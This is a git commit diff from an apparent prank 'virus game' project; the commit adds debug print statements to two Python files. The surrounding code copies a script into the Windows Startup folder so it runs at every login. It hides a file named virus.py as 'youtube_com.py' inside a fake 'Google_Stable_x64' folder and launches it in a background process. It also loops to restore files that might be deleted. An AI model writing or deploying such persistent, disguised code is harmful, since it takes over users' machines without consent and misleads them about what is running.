b7898d30a54ef86d8f5c57dc868b9ff2b7f245e8
hacaric <hacaric.dev@gmail.com>
2025-10-31 13:58:16 +0100

    added debug statements

--- installer.py
+++ installer.py
@@ -1,9 +1,12 @@
 import os, sys
 PYTHON_COMMAND = sys.executable
 
+print("Starting installer...")
+
 home_dir = os.path.expanduser("~")
 startup_folder = f"{home_dir}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup".replace("/", "\\")
 
+print("Copying files...")
 # Create the directories
 os.system(f"mkdir {home_dir}/Downloads/Google_Stable_x64/assets/cache/".replace("/", "\\"))
 
@@ -13,5 +16,5 @@ os.system(f"copy virus_game_startup.py {startup_folder}\\virus_game_startup.py")
 os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 %USERPROFILE%/Music/youtube_com-watch-dQw4w9WgXcQ.mp3".replace("/", "\\"))
 os.system(f"copy youtube_com-watch-dQw4w9WgXcQ.mp3 %USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3".replace("/", "\\"))
 os.system(f"copy virus.py %USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com.py".replace("/", "\\"))
-
+print("Running virus_game_startup.py...")
 os.system(f"{PYTHON_COMMAND} '{startup_folder}/virus_game_startup.py'".replace("/", "\\"))
--- src/virus_game_startup.py
+++ src/virus_game_startup.py
@@ -4,20 +4,25 @@ from multiprocessing import Process
 PYTHON_COMMAND = sys.executable
 home_dir = os.path.expanduser("~")
 # Backup file, file to check
+
+print("Checkpoint1")
 files_to_backup = [
   (__file__, __file__),
   (f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3".replace("/", "\\"), f"{home_dir}/Music/youtube_com-watch-dQw4w9WgXcQ.mp3".replace("/", "\\"))
 ]
+print("Checkpoint2")
 
 backuped_files = [open(path, "r").read() for path, _ in files_to_backup]
 
 virus_path = f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com.py".replace("/", "\\")
 
+print("Checkpoint3")
 start_virus = lambda: os.system(f"{PYTHON_COMMAND} {virus_path}")
 virus_thread = Process(target=start_virus)
 virus_thread.start()
 
 
+print("Checkpoint4")
 while True:
   for index, file_paths in enumerate(files_to_backup):
     backup = backuped_files[index]
